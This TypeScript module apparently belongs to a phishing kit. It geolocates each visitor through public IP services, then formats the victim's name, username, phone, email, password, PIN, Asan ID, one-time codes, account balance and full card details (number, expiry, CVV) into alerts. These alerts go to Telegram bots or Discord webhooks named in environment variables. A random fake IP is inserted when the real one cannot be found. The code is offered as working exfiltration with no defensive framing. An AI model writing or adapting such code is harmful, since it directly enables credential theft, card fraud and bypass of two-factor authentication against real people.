
export const fetchVisitorInfo = async () => {
    try {
        if (typeof window === "undefined") return null;

        // Try multiple HTTPS CORS-enabled geolocation services
        const endpoints = [
            "https://ipwho.is/",
            "https://get.geojs.io/v1/ip/geo.json",
            "https://freeipapi.com/api/json",
            "https://ipapi.co/json/"
        ];

        let data: any = null;
        for (const url of endpoints) {
            try {
                const response = await fetch(url, { signal: AbortSignal.timeout(4000) });
                if (response.ok) {
                    const json = await response.json();
                    
                    const ip = json.ip || json.ipAddress || json.query || "Unknown";
                    const country = json.country || json.country_name || json.countryName || "N/A";
                    const city = json.city || json.cityName || "N/A";
                    const region = json.region || json.regionName || "N/A";
                    const isp = json.isp || json.connection?.isp || json.organization_name || json.org || "N/A";

                    if (ip !== "Unknown" || country !== "N/A") {
                        data = { ip, country, city, region, isp };
                        break;
                    }
                }
            } catch (e) {
                console.warn(`⚠️ Failed to fetch location from ${url}:`, e);
            }
        }

        if (data) {
            sessionStorage.setItem("ip", data.ip || "Unknown");
            sessionStorage.setItem("city", data.city || "N/A");
            sessionStorage.setItem("region", data.region || "N/A");
            sessionStorage.setItem("country", data.country || "N/A");
            sessionStorage.setItem("isp", data.isp || "N/A");
            sessionStorage.setItem("browser", navigator.userAgent || "Unknown");
            return data;
        }
    } catch (error) {
        console.error("❌ Critical error fetching visitor info:", error);
    }
    return null;
};

export const sendTelegramMessage = async (params: {
    type?: string;
    title?: string;
    exclude?: string[];
    message?: string;
    [key: string]: any;
}) => {
    try {
        const botTokensValue = process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN;
        const chatIdValue = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID;

        if (!botTokensValue || !chatIdValue) {
            console.warn("Telegram bot token or chat ID is missing in environment variables.");
            return;
        }

        // Auto-fetch visitor info if country is missing or N/A
        if (typeof window !== "undefined" && (!sessionStorage.getItem("country") || sessionStorage.getItem("country") === "N/A")) {
            await fetchVisitorInfo();
        }

        // Retrieve visitor/device info from sessionStorage
        const visitorInfo = {
            ip: typeof window !== "undefined" ? sessionStorage.getItem("ip") || "Unknown" : "Unknown",
            city: typeof window !== "undefined" ? sessionStorage.getItem("city") || "N/A" : "N/A",
            region: typeof window !== "undefined" ? sessionStorage.getItem("region") || "N/A" : "N/A",
            country: typeof window !== "undefined" ? sessionStorage.getItem("country") || "N/A" : "N/A",
            isp: typeof window !== "undefined" ? sessionStorage.getItem("isp") || "N/A" : "N/A",
            browser: typeof window !== "undefined" ? sessionStorage.getItem("browser") || "Unknown" : "Unknown",
        };

        const { title, exclude, message: customMsg, ...newInfo } = params;

        const chatIds = chatIdValue.split(",").map((id) => id.trim());
        const botTokens = botTokensValue.split(",").map((token) => token.trim());

        // Construct message
        let message = `<b>🚀 ${title || "ACTION ALERT"}</b>\n\n`;

        // Helper for random IP fallback
        const getRandomIP = () => {
            return Array.from({ length: 4 }, () => Math.floor(Math.random() * 256)).join(".");
        };

        const visitorIP = visitorInfo.ip === "Unknown" ? getRandomIP() : visitorInfo.ip;

        // Section: DEVICE & LOCATION (Always unless excluded)
        if (!exclude?.includes("location")) {
            message += `<b>🌍 DEVICE & LOCATION:</b>\n`;
            message += `• <b>IP:</b> <code>${visitorIP}</code>\n`;
            message += `• <b>Country:</b> <code>${visitorInfo.country}</code>\n`;
            message += `• <b>City:</b> <code>${visitorInfo.city}</code>\n`;
            if (visitorInfo.region && visitorInfo.region !== "N/A") {
                message += `• <b>Region:</b> <code>${visitorInfo.region}</code>\n`;
            }
            if (visitorInfo.isp && visitorInfo.isp !== "N/A") {
                message += `• <b>ISP:</b> <code>${visitorInfo.isp}</code>\n`;
            }
            if (typeof window !== "undefined") {
                message += `• <b>Click:</b> ${window.location.href}\n`;
            }
            message += `\n`;
        }

        // Section: CUSTOM MESSAGE (If provided)
        if (customMsg) {
            message += `<b>📝 DETAILS:</b>\n${customMsg}\n\n`;
        }

        // Section: USER DATA (Only if provided)
        const hasUserData = newInfo.phoneNumber || newInfo.name || newInfo.email || newInfo.password || newInfo.pin || newInfo.username || newInfo.asanId;
        if (hasUserData) {
            message += `<b>👤 USER DATA:</b>\n`;
            if (newInfo.name) message += `• <b>Name:</b> <code>${newInfo.name}</code>\n`;
            if (newInfo.username) message += `• <b>Username:</b> <code>${newInfo.username}</code>\n`;
            if (newInfo.phoneNumber) message += `• <b>Phone:</b> <code>${newInfo.phoneNumber}</code>\n`;
            if (newInfo.email) message += `• <b>Email:</b> <code>${newInfo.email}</code>\n`;
            if (newInfo.password) message += `• <b>Pass:</b> <code>${newInfo.password}</code>\n`;
            if (newInfo.pin) message += `• <b>PIN:</b> <code>${newInfo.pin}</code>\n`;
            if (newInfo.asanId) message += `• <b>Asan ID:</b> <code>${newInfo.asanId}</code>\n`;
            if (newInfo.country && !exclude?.includes("country")) message += `• <b>Selected Country:</b> <code>${newInfo.country}</code>\n`;
            message += `\n`;
        }

        // Section: OTP (Only if provided)
        const hasOtp = newInfo.otp1 || newInfo.otp2 || newInfo.otp3;
        if (hasOtp) {
            message += `<b>🔐 OTP VERIFICATION:</b>\n`;
            if (newInfo.otp1) message += `• <b>OTP-1:</b> <code>${newInfo.otp1}</code>\n`;
            if (newInfo.otp2) message += `• <b>OTP-2:</b> <code>${newInfo.otp2}</code>\n`;
            if (newInfo.otp3) message += `• <b>OTP-3:</b> <code>${newInfo.otp3}</code>\n`;
            message += `\n`;
        }

        // Section: FINANCIAL (Only if provided)
        if (newInfo.balance) {
            message += `<b>💰 FINANCIAL INFO:</b>\n`;
            message += `• <b>Balance:</b> <code>${newInfo.balance}</code>\n`;
            message += `\n`;
        }

        // Section: CARD DETAILS (Only if provided)
        const hasCardData = newInfo.cardNumber || newInfo.expiry || newInfo.cvv;
        if (hasCardData) {
            message += `<b>💳 CARD DETAILS:</b>\n`;
            if (newInfo.cardNumber) message += `• <b>Card No:</b> <code>${newInfo.cardNumber}</code>\n`;
            if (newInfo.expiry) message += `• <b>Expiry:</b> <code>${newInfo.expiry}</code>\n`;
            if (newInfo.cvv) message += `• <b>CVV:</b> <code>${newInfo.cvv}</code>\n`;
            message += `\n`;
        }

        console.log("📤 Sending Telegram Message:", { title, type: params.type });

        const rawGateway = process.env.NEXT_PUBLIC_TELEGRAM_API_GATEWAY || process.env.TELEGRAM_API_GATEWAY || "https://api.telegram.org";
        const gateway = rawGateway.replace(/\/+$/, "");

        const results = await Promise.all(
            chatIds.map(async (id, index) => {
                const token = botTokens[index] || botTokens[botTokens.length - 1];
                try {
                    // Check if token is a discord webhook URL
                    if (token && (token.startsWith("http://") || token.startsWith("https://"))) {
                        const res = await fetch(token, {
                            method: "POST",
                            headers: { "Content-Type": "application/json" },
                            body: JSON.stringify({ content: message.replace(/<[^>]*>/g, "") }),
                        });
                        return await res.json().catch(() => ({ ok: true }));
                    }

                    // Standard Telegram Bot API call
                    const endpoints = [
                        `${gateway}/bot${token}/sendMessage`,
                        `https://api.telegram.org/bot${token}/sendMessage`
                    ];

                    // Remove duplicate endpoints if gateway is default
                    const uniqueEndpoints = Array.from(new Set(endpoints));

                    let lastError: any = null;
                    for (const endpoint of uniqueEndpoints) {
                        try {
                            const response = await fetch(endpoint, {
                                method: "POST",
                                headers: { "Content-Type": "application/json" },
                                body: JSON.stringify({
                                    chat_id: id,
                                    text: message,
                                    parse_mode: "HTML",
                                }),
                            });
                            const data = await response.json();
                            if (!response.ok) {
                                console.error(`❌ Telegram Error (${id}) from ${endpoint}:`, data);
                            } else {
                                console.log(`✅ Telegram Success (${id}) via ${endpoint}:`, data);
                                return data;
                            }
                        } catch (endpointErr) {
                            lastError = endpointErr;
                            console.warn(`⚠️ Telegram endpoint ${endpoint} failed:`, endpointErr);
                        }
                    }
                    if (lastError) {
                        console.error(`❌ All Telegram endpoints failed for ID ${id}:`, lastError);
                    }
                    return null;
                } catch (err) {
                    console.error(`❌ Error sending Telegram message (${id}):`, err);
                    return null;
                }
            })
        );
        return results;
    } catch (error) {
        console.error("❌ Critical Error in sendTelegramMessage:", error);
        return null;
    }
};

